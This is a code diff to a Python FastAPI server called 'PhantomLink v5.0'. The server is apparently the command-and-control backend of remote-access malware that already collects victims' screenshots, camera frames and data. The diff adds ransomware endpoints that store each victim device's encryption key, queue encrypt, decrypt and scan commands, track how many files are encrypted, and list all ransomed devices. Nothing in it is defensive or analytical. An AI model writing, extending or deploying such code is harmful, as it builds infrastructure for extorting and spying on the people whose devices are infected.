@@ -13,13 +13,15 @@ app.add_middleware(CORSMiddleware,
 SECRET         = "phantomlink2025"
 DEVICE_TIMEOUT = 30
 
-devices     = {}
-commands    = {}
-screenshots = {}
-cam_frames  = {}
-data_store  = {}
-chat_c2v    = {}   # controller -> victim
-chat_v2c    = {}   # victim -> controller
+devices        = {}
+commands       = {}
+screenshots    = {}
+cam_frames     = {}
+data_store     = {}
+chat_c2v       = {}   # controller -> victim
+chat_v2c       = {}   # victim -> controller
+enc_keys       = {}   # device_id -> {"key":str, "ts":float, "status":str}
+ransom_cmds    = {}   # device_id -> {"cmd":str, "data":str}  (encrypt/decrypt/close)
 _lk = threading.Lock()
 
 def _auth(s):
@@ -44,6 +46,62 @@ class Data(BaseModel):
 
 class Chat(BaseModel):
     secret:str; device_id:str; msg:str; sender:str="controller"
+
+class KeyStore(BaseModel):
+    secret:str; device_id:str; key:str; status:str="encrypted"
+
+class RansomCmd(BaseModel):
+    secret:str; device_id:str; cmd:str; data:str=""   # cmd: encrypt|decrypt|close|scan
+
+class RansomStatus(BaseModel):
+    secret:str; device_id:str; status:str; files_count:int=0; files_done:int=0
+
+# ── key / ransom endpoints ─────────────────────────────────────────
+@app.post("/key")
+def store_key(b:KeyStore):
+    _auth(b.secret)
+    with _lk:
+        enc_keys[b.device_id]={"key":b.key,"status":b.status,"ts":time.time()}
+    return {"ok":True}
+
+@app.get("/key")
+def get_key(secret:str, device_id:str):
+    _auth(secret)
+    with _lk:
+        return enc_keys.get(device_id,{"key":None,"status":"none","ts":0})
+
+@app.post("/ransom_cmd")
+def post_ransom_cmd(b:RansomCmd):
+    _auth(b.secret)
+    with _lk:
+        ransom_cmds[b.device_id]={"cmd":b.cmd,"data":b.data}
+    return {"ok":True}
+
+@app.get("/ransom_cmd")
+def get_ransom_cmd(secret:str, device_id:str):
+    _auth(secret)
+    with _lk:
+        cmd=ransom_cmds.get(device_id,{"cmd":"none","data":""})
+        ransom_cmds[device_id]={"cmd":"none","data":""}
+    return cmd
+
+@app.post("/ransom_status")
+def post_ransom_status(b:RansomStatus):
+    _auth(b.secret)
+    with _lk:
+        existing=enc_keys.get(b.device_id,{})
+        existing["status"]=b.status
+        existing["files_count"]=b.files_count
+        existing["files_done"]=b.files_done
+        existing["ts_update"]=time.time()
+        enc_keys[b.device_id]=existing
+    return {"ok":True}
+
+@app.get("/ransom_all")
+def get_ransom_all(secret:str):
+    _auth(secret)
+    with _lk:
+        return dict(enc_keys)
 
 @app.get("/")
 def root(): return {"status":"PhantomLink v5.0 online"}
@@ -156,4 +214,4 @@ def list_devices(secret:str):
     with _lk:
         return {did:{**info,"online":(now-info["last_seen"])<DEVICE_TIMEOUT}
                 for did,info in devices.items()}
-            
+        
